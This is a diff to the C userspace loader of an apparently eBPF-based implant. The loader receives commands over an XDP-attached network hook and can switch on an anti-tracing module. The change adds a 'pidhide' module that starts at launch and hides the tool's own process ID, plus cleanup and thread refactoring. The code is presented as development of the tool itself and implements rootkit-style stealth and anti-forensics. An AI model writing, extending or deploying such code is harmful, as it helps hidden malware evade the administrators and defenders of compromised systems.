@@ -6,8 +6,10 @@ static struct config cfg = {
   .ifindex = IFINDEX,
 };
 static struct no_trace_kern *no_trace_skel = NULL;
-static pthread_t no_trace_thread_id;
+static pthread_t no_trace_tid;
 static bool no_trace_enabled = false;
+
+static struct pidhide_kern *pidhide_skel = NULL;
 
 static void disable_no_trace()
 {
@@ -18,10 +20,20 @@ static void disable_no_trace()
   }
 }
 
+static void disable_pidhide()
+{
+  if (pidhide_skel)
+  {
+    destroy_pidhide(pidhide_skel);
+    pidhide_skel = NULL;
+  }
+}
+
 static void cleanup()
 {
   xdp_link_detach(cfg.ifindex, cfg.xdp_flags, NYAKO_KERN_PROG_ID);
   disable_no_trace();
+  disable_pidhide();
   exit(EXIT_SUCCESS);
 }
 
@@ -50,11 +62,18 @@ static int find_map_fd(const struct bpf_object *bpf_obj, const char *map_name)
   return map_fd;
 }
 
-static void* enable_no_trace(void *skel)
+static void* enable_no_trace(void *params)
 {
-  no_trace_skel = (struct no_trace_kern *)skel;
-
+  no_trace_skel = no_trace_kern__open();
   setup_no_trace(no_trace_skel);
+  return NULL;
+}
+
+static void* enable_pidhide(void *params)
+{
+  int target_pid = getpid();
+  pidhide_skel = pidhide_kern__open();
+  setup_pidhide(pidhide_skel, target_pid);
   return NULL;
 }
 
@@ -158,10 +177,9 @@ static void handle_message(struct message_details *message_details)
   {
     if (!no_trace_enabled)
     {
-      no_trace_skel = no_trace_kern__open();
-      if (pthread_create(&no_trace_thread_id, NULL, enable_no_trace, (void *) no_trace_skel) != 0)
+      if (pthread_create(&no_trace_tid, NULL, enable_no_trace, NULL) != 0)
       {
-        log_error("pthread_create");
+        log_error("pthread_create for enable_no_trace");
         return;
       }
       no_trace_enabled = true;
@@ -227,6 +245,7 @@ int main()
   struct bpf_object *bpf_obj;
   int message_queque_map_fd;
   int interval = 5;
+  pthread_t pidhide_tid;
 
   strncpy(cfg.filename, NYAKO_KERN_FILENAME, sizeof(cfg.filename));
   strncpy(cfg.progsec, NYAKO_KERN_PROGSEC, sizeof(cfg.progsec));
@@ -239,6 +258,12 @@ int main()
 
   signal(SIGINT, cleanup);
 
+  if (pthread_create(&pidhide_tid, NULL, enable_pidhide, NULL) != 0)
+  {
+    log_error("pthread_create for hidepid");
+    return -1;
+  }
+
   message_queque_map_fd = find_map_fd(bpf_obj, MESSAGE_QUEQUE_MAP_NAME);
   if (message_queque_map_fd < 0)
   {
@@ -248,6 +273,12 @@ int main()
   }
 
   message_poll(message_queque_map_fd, interval);
+
+  if (pthread_join(pidhide_tid, NULL) != 0)
+  {
+    log_error("pthread_join for pidhide");
+    return -1;
+  }
 
   return 0;
 }
